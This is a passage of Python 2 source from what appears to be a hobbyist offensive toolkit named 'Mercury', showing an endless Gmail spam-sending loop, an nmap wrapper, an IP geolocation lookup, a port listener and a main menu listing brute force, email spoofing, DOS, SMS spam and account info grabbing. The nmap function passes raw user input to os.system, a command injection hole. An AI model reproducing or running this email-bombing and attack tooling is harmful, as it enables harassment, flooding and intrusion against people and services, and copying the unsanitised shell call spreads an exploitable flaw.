		body = 'MERCURY'
		server.starttls()
		server.login(sender, password)
	except smtplib.SMTPAuthenticationError:
		print ('Incorrect password! ')
		emailspam()
	except KeyboardInterrupt:
		mainmenu()
	else:
		long()
		mainmenu()
		try:

			while True:
				server.sendmail(sender, reciever, message)
				print ('email has been sent to %s') % reciever
		except KeyboardInterrupt:
			mainmenu()

def geoLocation(): 
	try:
		target = raw_input(Fore.CYAN + '	Enter an ip address: ') #User Input
		send_url = 'http://freegeoip.net/json/'+target #Finds Targets
		r = requests.get(send_url) #Sends Url
		j = json.loads(r.text) #Reads All Text
		cn = j['country_name'] #Reads Country
		rc = j['region_code'] #Reads Region Code
		city = j['city'] #Reads City
		lat = j['latitude'] #Read Latitiude
		lon = j['longitude'] #Read Longitude
		print (lat)
		print  (lon)
		print (city)
		print (rc)
		print (cn)
		long() #Pause
		mainmenu()
	except ValueError:
		print ('Invalid ip address')
		quick()
		mainmenu()
	except KeyboardInterrupt:
		mainmenu()
def file():
	dirt = raw_input(Fore.CYAN + '		Enter a file location: ') 
	t = os.listdir(dirt) #Change To Ls For Linux Users
	count = 0
	space()
	space()
	print (Fore.CYAN + '----------------------')
	while True:
		try:
			print (t[count])
			count += 1
		except KeyboardInterrupt:
			mainmenu()
		except WindowsError:
			mainmenu()
		except IndexError:
			print (Fore.CYAN + '----------------------')
			long()
			mainmenu()
def nmap():
	nmap_ins = raw_input(Fore.CYAN + 'Have you already installed nmap? y/n ')
	if nmap_ins == 'n':
		print (Fore.RED + 'Install in then use this tool')
		long()
		mainmenu()
	if nmap_ins == 'y':
		ip = raw_input(Fore.CYAN + 'Enter an ip: ')
		os.system('nmap -T4 -A -v '+ip)
		mainmenu()
def listen():
	global ip
	print (Fore.RED + 'Once started it cant be stoped without fully closing the program! ')
	port = raw_input(Fore.CYAN + 'Enter a port: ')
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	port = int(port)
	try:
		s.bind((ip,port))
		s.listen(1)
		while True:
  		 	print s.accept()[1]
  		 	space()
	except KeyboardInterrupt:
		s.close()
		mainmenu()
proxys_num2 = 0
proxys_num = 0
def mainmenu():
	clear()
	print (Fore.WHITE +  color.BOLD + '''  /$$      /$$                                                            
 | $$$    /$$$                                                            
 | $$$$  /$$$$  /$$$$$$   /$$$$$$   /$$$$$$$ /$$   /$$  /$$$$$$  /$$   /$$
 | $$ $$/$$ $$ /$$__  $$ /$$__  $$ /$$_____/| $$  | $$ /$$__  $$| $$  | $$
 | $$  $$$| $$| $$$$$$$$| $$  \__/| $$      | $$  | $$| $$  \__/| $$  | $$ 
\033[96m | $$\  $ | $$| $$_____/| $$      | $$      | $$  | $$| $$      | $$  | $$
 | $$ \/  | $$|  $$$$$$$| $$      |  $$$$$$$|  $$$$$$/| $$      |  $$$$$$$
 |__/     |__/ \_______/|__/       \_______/ \______/ |__/       \____  $$
                    \033[91m[Coded By MetaChar] \033[1;37;40m                         /$$  | $$
                  \033[91m[Instagram: @Seleniumm]\033[1;37;40m                        | $$$$$$/
                     [%s]\033[1;37;40m                            \______/
 ''') % ip
	space()
	print (Fore.WHITE + '''
	[0]\033[96m ReadMe and license \033[1;37;40m 		[9]\033[96m SourceCode from website \033[1;37;40m		[18]\033[96m Gmail Spam\033[1;37;40m
	[1]\033[96m Brute force \033[1;37;40m 			[10]\033[96m Ip address from website\033[1;37;40m		[19]\033[96m Gmail Spoof\033[1;37;40m
	[2]\033[96m Port Listen \033[1;37;40m             		[11]\033[96m Find sublinks\033[1;37;40m                      [20]\033[96m Does Site Exist \033[1;37;40m
	[3]\033[96m GeoLocation \033[1;37;40m            	        [12]\033[96m Hash encode\033[1;37;40m                        [21]\033[96m Hex decode /encode \033[1;37;40m
	[4]\033[96m Show mac address \033[1;37;40m			[13]\033[96m Download tools\033[1;37;40m                     [22]\033[96m Find Admin Panel \033[1;37;40m
	[5]\033[96m Website online/offline \033[1;37;40m		[14]\033[96m Nmap\033[1;37;40m                               [23]\033[96m DOS \033[1;37;40m
	[6]\033[96m File explorer \033[1;37;40m			[15]\033[96m Proxy Scraper \033[1;37;40m                     [24]\033[96m SMS Spam\033[1;37;40m
	[7]\033[96m GitHub cloner \033[1;37;40m			[16]\033[96m Google Dorks\033[1;37;40m  	  	        [25]\033[96m Websites \033[1;37;40m
	[8]\033[96m Pip installer \033[1;37;40m 			[17]\033[96m Proxy Browser\033[1;37;40m 	                [26]\033[96m Twitter Info Grabber \033[1;37;40m
		              
	[100]\033[96m Update\033[1;37;40m	[99]\033[96m Exit tool\033[1;37;40m	
	''')
	ans = raw_input(Fore.WHITE + 'Enter a choice  ~# ')
	if ans == '0':
		readme()
	if ans == '1':
		brute_force()
	if ans == '2':
		listen()
	if ans == '3':
		geoLocation()
	if ans == '4':
		mac()
	if ans == '5':
		networksweb()
	if ans == '6':
		file()
	if ans == '7':
		github()
	if ans == '8':
		pip_installer()
	if ans == '9':
		sourcecode()
	if ans == '10':
		ipaddress()
	if ans =='11':
		sub_link()
	if ans == '12':
		hash()
	if ans == '13':
		toolss()
	if ans == '14':
		nmap()
	if ans == '15':
		proxys()
	if ans == '16':
		dork1()
	if ans == '17':
		webbrowserfunc()
	if ans == '18':
		emailspam()
	if ans == '19':
		emailspoofsetup()
	if ans == '20':
		siteexists()
	if ans == '21':
		hex()
	if ans == '22':
		admin()
	if ans == '23':
		ddos()
	if ans == '24':
		sms()
	if ans == '25':
		websitess()
	if ans == '26':
		twitter()
	if ans == '99':
		clear()
		exit()
	if ans == '100':
		update()
	else:
		mainmenu()
def InternetCheck():
	try:
		urllib2.urlopen('https://www.google.com')
	except:
		print (Fore.RED + 'There in no Internet connection...')
		long()
def PlatformCheck():
	if sys.platform == 'win32':
		print(Fore.CYAN + "Windows Detected")  ##Windows 32-bit Check
		quick()
		agreement()

	if sys.platform == 'win64':
		print(Fore.CYAN + "Windows Detected")  ##Windows 64-bit Check
		quick()
		agreement()

	else:
		print(Fore.RED + "Unix/Linux Kernel detected... mercury is built for windows\n")  #Linux
		long()
		agreement()
try:
	attempt = 0
	InternetCheck()
	PlatformCheck()
	mainmenu()
except KeyboardInterrupt:
	mainmenu()
